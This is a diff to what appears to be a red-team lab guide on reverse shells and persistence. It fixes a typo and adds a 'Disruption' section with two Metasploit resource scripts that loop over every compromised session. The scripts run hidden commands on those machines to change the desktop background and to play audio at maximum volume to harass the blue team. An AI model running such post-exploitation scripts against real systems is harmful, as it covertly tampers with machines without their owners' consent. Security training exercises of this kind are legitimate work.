@@ -1,6 +1,6 @@
 # Guide   
 
-This is a guide to setting up a reverse shell and Gaining Persistance in the environment. 
+This is a guide to setting up a reverse shell and gaining persistance in the environment. 
 
 ## Senario
 
@@ -386,8 +386,39 @@ This payload will find the meterpreter payload that I created and copy it to /sb
 ![alt text](https://github.com/vipertooth/Notes/blob/master/Lab1/Pictures/newsessions.png)
 
 
+## Disruption   
 
+To dirupt the blue team we changed the background and played music.
 
+To change the background we ran a resource file   
+mass-background-change.rc
+```ruby
+<ruby>
+framework.sessions.each do |num,session|
+print_status("Uploading Image to session #{num}")
+session.fs.file.upload_file("/tmp/.Flag.jpg","Flag.jpg")
+print_status("Uploaded, Changing Background")
+session.sys.process.execute("/bin/bash", "-c 'gsettings set org.gnome.desktop.background picture-uri file:///tmp/.Flag.jpg'", {'Hidden' => true, 'Channelized' => false})
+print_status("Successfully changed Background on session #{num}")
+end
+</ruby>
+```
+
+To play music again we ran a resource file   
+mass-audio-rickroll.rc
+```ruby
+<ruby>
+framework.sessions.each do |num,session|
+print_status("Uploading Image to session #{num}")
+session.fs.file.upload_file("/tmp/rick.wav","rick.wav")
+print_status("Uploaded")
+session.sys.process.execute("/bin/bash", "-c 'amixer set "Master" 100%'", {'Hidden' => true, 'Channelized' => false})
+print_status("Set volume to max")
+session.sys.process.execute("/bin/bash", "-c 'aplay /tmp/rick.wav'", {'Hidden' => true, 'Channelized' => false})
+print_status("Rick Rolling session #{num}")
+end
+</ruby>
+```
 
 
 
